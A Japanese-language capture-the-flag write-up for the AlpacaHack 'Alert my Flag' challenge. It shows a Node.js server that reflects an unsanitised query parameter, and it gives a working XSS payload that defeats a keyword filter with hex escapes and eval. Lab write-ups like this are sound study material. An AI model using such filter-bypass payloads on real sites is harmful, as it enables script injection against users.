# Alert my Flag

https://alpacahack.com/daily/challenges/alert-my-flag

## 問題の概要

クエリパラメータ `username` を工夫して `alert(flag)` を実行させる XSS の問題です。

ローカルのブラウザのアドレスバーで XSS が成功するかを試し、成功した URL を開いたページで `Submit this page!` をクリックすると、サーバーで `puppeteer` を使ってその URL が開かれ、XSS が成功していればフラグを得ることができる親切設計です。

Node.js サーバーで、サニタイズなしで `username` クエリパラメータを HTML に埋め込んでいるため、XSS が可能です。

```js
if (username.includes("flag") || username.includes("alert")) {
  result = "<p>invalid input</p>";
} else {
  result = `<h1>Hello ${username}!</h1>`;
}
const html = `<!DOCTYPE html>
<html>
<head>
  <script>const flag="${flag}";</script>
</head>
<body>
  ${result}
  <p>Try <a href="/?username=<i>admin</i>">this page?</a>
  ...
</html>`;
```

## 解法

`username` に `<script>` タグを入れることで XSS を実行できますが、`flag` と `alert` を含むとサーバー側で弾かれてしまいます。

文字列でプロパティにアクセスするようにし、Unicode エスケープを使って `"a"` を `"\x61"` のように表現すれば回避できます。

```js
this["\x61lert"](this["fl\x61g"]);
```

だめでした。`const` で宣言された変数は `var` で宣言された変数とは異なり、グローバルオブジェクトのプロパティにならないため、`this.flag` でアクセスできません。

代わりに `eval` を使いました。

## 解答に使用した入力

```
?username=<script>this["\x61lert"](eval("fl\x61g"))</script>
```
